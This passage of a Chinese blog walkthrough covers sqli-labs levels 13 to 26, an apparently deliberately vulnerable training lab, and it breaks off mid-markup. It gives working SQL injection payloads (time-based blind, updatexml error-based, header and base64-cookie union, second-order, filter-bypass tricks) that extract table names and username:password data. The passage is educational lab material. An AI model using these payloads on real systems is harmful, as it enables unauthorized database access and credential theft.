title="13-16(POST方式的时间盲注)"></a>13-16(POST方式的时间盲注)</h2><ol><li><p>判断是否存在<strong>SQL注入</strong>并判断注入类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) #  登录成功，但没有回显</span><br></pre></td></tr></table></figure><p>构造成功，然后使用时间盲注</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(length(database())&gt;7,sleep(10),1) #         判断数据库名长度</span><br><span class="line">admin&#x27;) and if(ascii(substring(database(),1,1))=115,sleep(10),1) #   判断数据库名第一个字符</span><br></pre></td></tr></table></figure><p>以此类推</p></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(10),1); #     判断表名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substring((select column_name from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; limit 0,1),1,1))=101,sleep(10),1); #     判断字段名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;) and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,sleep(10),1); #</span><br><span class="line">判断数据</span><br></pre></td></tr></table></figure></li></ol><ul><li><p>第14关差不多，只是构造方式变成了双引号</p></li><li><p>第15关和第11关差不多</p></li><li><p>第16关和第12关差不多</p></li></ul><h2 id="17-POST方式的报错注入"><a href="#17-POST方式的报错注入" class="headerlink" title="17(POST方式的报错注入)"></a>17(POST方式的报错注入)</h2><ol><li>判断是否存在<strong>SQL注入</strong>并判断注入类型<br>如果不知道源码，去一遍遍尝试，会发现无论是布尔盲注还是时间盲注都无法得到预期结果，因此我们可以采用报错注入。<br>首先，那我们可以从源码中发现，有一个过滤函数check_input，其过滤步骤是：</li></ol><ul><li><code>substr($value,0,15)</code>截断到15位</li><li>单引号，双引号，反斜杠，null自动使用反斜杠转义</li><li>stripslashes()去掉多余的反斜杠<br>然后，passwd没有使用过滤函数过滤，因而可以进行注入。由此可使用报错注入。</li></ul><ol start="2"><li><p>获取当前<strong>数据库名和数据库版本号</strong><br>第一个用户名填写：admin<br>第二个密码填写所需的报错注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,version(),0x5c),1))#     爆版本</span><br><span class="line">123&#x27; and (updatexml(1,concat(0x5c,database(),0x5c),1))#    爆数据库</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x5c),1))#      爆表名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123&#x27; and (updatexml(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name =&#x27;users&#x27;),0x5c),1))#    爆字段名</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users limit 0,1)test),0x7e),1) #  爆用户</span><br><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select username from (select username from users where username=&#x27;admin&#x27; limit 0,1)test),0x7e),1) #      爆密码</span><br></pre></td></tr></table></figure></li></ol><h2 id="18-User-Agent方式的报错注入"><a href="#18-User-Agent方式的报错注入" class="headerlink" title="18(User-Agent方式的报错注入)"></a>18(User-Agent方式的报错注入)</h2><ol><li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_18.png" alt="返回情况"><br>返回了ip和user-agent的识别客户使用的操作系统及版本、CPU 类型、浏览器及版本、浏览器渲染引擎、浏览器语言、浏览器插件等<br>我们通过源码的check_input可以得知，username和passwd都被过滤了。所以我们不能使用在POST处注入手段。<br>继续检查源码，可以发现这条语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p>因此我们可以从user-agent处注入。</p></li><li><p>通过burp抓包注入<br>burp的下载安装配置这里暂且不提，默认已弄好。<br>注意，如果是第一次抓包，会无法抓到，因为浏览器默认是不会抓127.0.0.1的包，需要自己设置。<br>打开Firefox，搜索about:config。<br>然后在访问后的搜索框内搜索 network.proxy.allow_hijacking_localhost，将值改为true</p></li></ol><p>另外还有一种方法，是将127改为自己的内网网址192.168.x.x<br>但这个方法我没成功，所以暂时搁置。</p><p>输入正确的用户名和密码后，在burp抓包，把user-agent的值改为我们需要注入的内容。如下图所示：<br><img src="/simg/sqli-labs_18_3.png" alt=" "></p><ol start="3"><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li></ol><h2 id="19-Referer方式的报错注入"><a href="#19-Referer方式的报错注入" class="headerlink" title="19(Referer方式的报错注入)"></a>19(Referer方式的报错注入)</h2><ol><li><p>测试并判断注入类型<br>首先username和password输入admin<br>发现返回如下情况：<br><img src="/simg/sqli-labs_19.png" alt="返回情况"><br>返回了Referer<br>Referer是HTTP头的一个字段，用于告诉服务器该网页是从哪个页面链接过来的<br>这一次，我们在Referer的字段注入。</p></li><li><p>获取当前<strong>数据库名和数据库版本号</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select database()),0x7e),1) or&#x27;</span><br><span class="line">&#x27;or updatexml(1,concat(0x7e,(select version()),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),0x7e),1) or&#x27;</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or (updatexml(1,concat(0x7e,(SELECT concat_ws(&#x27;:&#x27;,username,password) FROM (SELECT username,password FROM users)text LIMIT 0,1),0x7e),1)) or &#x27; </span><br></pre></td></tr></table></figure></li></ol><h2 id="20-Cookie方式的联合注入"><a href="#20-Cookie方式的联合注入" class="headerlink" title="20(Cookie方式的联合注入)"></a>20(Cookie方式的联合注入)</h2><ol><li><p>测试并判断注入类型<br>正常输入了admin之后，我们发现出现了如下界面：<br><img src="/simg/sqli-labs_20.png" alt="返回情况"><br>点击下方的按钮，返回到原来界面<br>接下来我们再次输入admin，并显示到该界面，可以明显看出，cookie字段显示出来。<br>然后我们按F12，点击存储，再点击Cookie下的链接，修改值为admin’<br>刷新后，出现报错，说明存在注入。<br>因此我们可以利用修改cookie的方式进行注入</p></li><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin<span class="string">&#x27;order by 4 #</span></span><br></pre></td></tr></table></figure><p>报错，说明字段数为3</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,database(),version() #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li></ol><h2 id="21-22-base64加密Cookie方式的联合注入"><a href="#21-22-base64加密Cookie方式的联合注入" class="headerlink" title="21-22(base64加密Cookie方式的联合注入)"></a>21-22(base64加密Cookie方式的联合注入)</h2><ol><li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li></ol><ul><li>第22关<br>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</li></ul><h2 id="23-GET方式的恒为真联合注入"><a href="#23-GET方式的恒为真联合注入" class="headerlink" title="23(GET方式的恒为真联合注入)"></a>23(GET方式的恒为真联合注入)</h2><ol><li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li></ol><ul><li>第1种<br>采用URL终止符<code>%00</code></li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种<br>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><h2 id="24-POST方式的二次注入"><a href="#24-POST方式的二次注入" class="headerlink" title="24(POST方式的二次注入)"></a>24(POST方式的二次注入)</h2><ol><li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure><p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p></li><li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p></li></ol><h2 id="25-25a-双写绕过的联合注入"><a href="#25-25a-双写绕过的联合注入" class="headerlink" title="25-25a(双写绕过的联合注入)"></a>25-25a(双写绕过的联合注入)</h2><ol><li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li></ol><p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第25a关<br>与25关类似，只是没有单引号</li></ul><h2 id="26-26a-括号绕过空格的报错注入或联合注入"><a href="#26-26a-括号绕过空格的报错注入或联合注入" class="headerlink" title="26-26a(括号绕过空格的报错注入或联合注入)"></a>26-26a(括号绕过空格的报错注入或联合注入)</h2><ol><li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li></ol><ul><li>编码绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li><li>括号绕过<br>用()绕过，不使用任何空格</li><li>以上方法不一定都对自己的配置有效，需要尝试</li></ul><ul><li>第1种<br>这里使用()的方式绕过空格</li></ul><ol start="2"><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种<br>这里使用%0b的方式绕过空格，%26%26绕过and</li></ul><ol start="2"><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 